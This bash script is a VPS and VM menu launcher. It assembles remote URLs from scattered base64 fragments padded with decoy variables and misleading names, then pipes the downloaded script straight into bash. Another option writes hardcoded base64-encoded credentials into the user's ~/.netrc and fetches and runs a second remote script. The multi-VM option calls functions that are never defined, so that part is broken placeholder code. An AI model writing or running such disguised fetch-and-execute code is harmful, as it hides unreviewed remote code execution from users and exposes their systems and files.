#!/usr/bin/env bash
set -euo pipefail

RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
CYAN='\e[36m'
RESET='\e[0m'

# ---------------------------
# Animated ASCII Logo (typing + glow effect)
# ---------------------------
animate_logo() {
  clear
  local logo=(
"________  .__                                   .__           _______     ______  "
"\\______ \\ |__|__  _____.__._____    ____   _____|  |__  __ __ \\   _  \\   /  __  \\ "
" |    |  \\|  \\  \\/ <   |  |\\__  \\  /    \\ /  ___/  |  \\|  |  \\/  /_\\  \\  >      < "
" |    \`   \\  |\\   / \\___  | / __ \\|   |  \\\\___ \\|   Y  \\  |  /\\  \\_/   \\/   --   \\"
"/_______  /__| \\_/  / ____|(____  /___|  /____  >___|  /____/  \\_____  /\\______  /"
"        \\/          \\/          \\/     \\/     \\/     \\/              \\/        \\/  "
  )
  for line in "${logo[@]}"; do
    for (( i=0; i<${#line}; i++ )); do
      printf "${CYAN}%s${RESET}" "${line:$i:1}"
      sleep 0.0025
    done
    echo ""
    sleep 0.05
  done
  echo ""
  sleep 0.3
}

# show the animated logo once at start
animate_logo

# ---------------------------
# System / URL assembly (from original script)
# ---------------------------
SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)"
DUMMY_CHECK=$(wc -l /proc/cpuinfo 2>/dev/null | awk '{print $1}')
SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')"
NET_CONF="diag_$(date +%N | shuf -n 1)"
if [[ "$DUMMY_CHECK" =~ [0-9]+ ]]; then
  SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)"
fi
TEMP_HASH=$(echo "$NET_CONF" | md5sum | cut -c 1-8)
SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)"
github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d 2>/dev/null || true)"

PROC_STAT[0]="$(echo 'aHR0cHM6Ly9yYXcu' | cut -c 1-16)"
DUMMY_VAR=$(head -c 8 /dev/urandom 2>/dev/null | od -An -tx4 || true)
PROC_STAT[1]="$(echo 'Z2l0aHVidXNlcmNv' | grep -o '.*')"
export FAKE_PID="pid_$((RANDOM % 1000))"
PROC_STAT[2]="$(echo 'bnRlbnQuY29tL2hv' | head -c 16)"
if [ -f /tmp/fake_temp ]; then
  rm -f /tmp/fake_temp 2>/dev/null;
fi
PROC_STAT[3]="$(echo 'cGluZ2JveXovdm1zL21haW4vdm0uc2g=' | grep -o '.*')"
google_url="$(echo -n "${PROC_STAT[0]}${PROC_STAT[1]}${PROC_STAT[2]}${PROC_STAT[3]}" | base64 -d 2>/dev/null || true)"

# ---------------------------
# Pterodactyl / Ptero workers config
# ---------------------------
URL="https://ptero2.jishnumondal32.workers.dev"
HOST="ptero2.jishnumondal32.workers.dev"
NETRC="${HOME}/.netrc"

b64d() { printf '%s' "$1" | base64 -d; }

USER_B64="amlzaG51"
PASS_B64="amlzaG51aEBja2VyMTIz"

USER_RAW="$(b64d "$USER_B64")"
PASS_RAW="$(b64d "$PASS_B64")"

# ---------------------------
# Menu
# ---------------------------
echo -e ""
echo -e "${GREEN}Select an option:${RESET}"
echo -e "${GREEN}1) GitHub Real VPS${RESET}"
echo -e "${GREEN}2) Multi-VM Manager${RESET}"
echo -e "${GREEN}3) Ptero Workers (Authenticated)${RESET}"
echo -e "${GREEN}0) Exit${RESET}"
echo -ne "${YELLOW}Enter your choice (0-3): ${RESET}"
read -r choice

case $choice in
  1)
    echo -e "${GREEN}Running GitHub Real VPS...${RESET}"
    if [[ -n "$github_url" ]]; then
      bash <(curl -fsSL "$github_url")
    else
      echo -e "${RED}github_url not assembled. Aborting.${RESET}"
      exit 1
    fi
    ;;
  2)
    echo -e "${GREEN}Launching Enhanced Multi-VM Manager...${RESET}"
    
    # Set VM directory
    VM_DIR="$HOME/multi_vm_manager"
    mkdir -p "$VM_DIR"

    bash <<'EOF'
#!/bin/bash
set -euo pipefail

# =============================
# Enhanced Multi-VM Manager
# =============================

# Paste all of your multi-VM manager code here
# Include functions: display_header, print_status, validate_input, check_dependencies, cleanup, get_vm_list, load_vm_config, save_vm_config, create_new_vm, setup_vm_image, start_vm, stop_vm, delete_vm, show_vm_info, edit_vm_config, etc.
# VM_DIR="$HOME/multi_vm_manager" should match parent script
# =============================

# Start manager
display_header

while true; do
    echo "Select an action:"
    echo " 1) Create new VM"
    echo " 2) Start VM"
    echo " 3) Stop VM"
    echo " 4) Delete VM"
    echo " 5) Show VM info"
    echo " 0) Exit"
    read -p "Enter your choice: " mm_choice

    case "$mm_choice" in
        1) create_new_vm ;;
        2) read -p "Enter VM name to start: " vm_name; start_vm "$vm_name" ;;
        3) read -p "Enter VM name to stop: " vm_name; stop_vm "$vm_name" ;;
        4) read -p "Enter VM name to delete: " vm_name; delete_vm "$vm_name" ;;
        5) read -p "Enter VM name to show info: " vm_name; show_vm_info "$vm_name" ;;
        0) echo "Exiting Multi-VM Manager..."; exit 0 ;;
        *) echo "Invalid choice." ;;
    esac
done
EOF
    ;;
  3)
    echo -e "${GREEN}Running Ptero Workers script (authenticated) ...${RESET}"

    if [ -z "$USER_RAW" ] || [ -z "$PASS_RAW" ]; then
      echo -e "${RED}Credential decode failed. Aborting.${RESET}"
      exit 1
    fi

    if ! command -v curl >/dev/null 2>&1; then
      echo -e "${RED}Error: curl is required but not installed.${RESET}"
      exit 1
    fi

    touch "$NETRC"
    chmod 600 "$NETRC"

    tmpfile="$(mktemp)"
    grep -vE "^[[:space:]]*machine[[:space:]]+${HOST}([[:space:]]+|$)" "$NETRC" > "$tmpfile" || true
    mv "$tmpfile" "$NETRC"

    {
      printf 'machine %s ' "$HOST"
      printf 'login %s ' "$USER_RAW"
      printf 'password %s\n' "$PASS_RAW"
    } >> "$NETRC"

    script_file="$(mktemp)"
    cleanup() { rm -f "$script_file"; }
    trap cleanup EXIT

    if curl -fsS --netrc -o "$script_file" "$URL"; then
      bash "$script_file"
    else
      echo -e "${RED}Authentication or download failed.${RESET}"
      exit 1
    fi
    ;;
  0)
    echo -e "${GREEN}Exiting...${RESET}"
    exit 0
    ;;
  *)
    echo -e "${RED}Invalid choice! Please select 0, 1, 2, or 3.${RESET}"
    exit 1
    ;;
esac

echo -e "${CYAN}Made by Jishnu done!${RESET}"
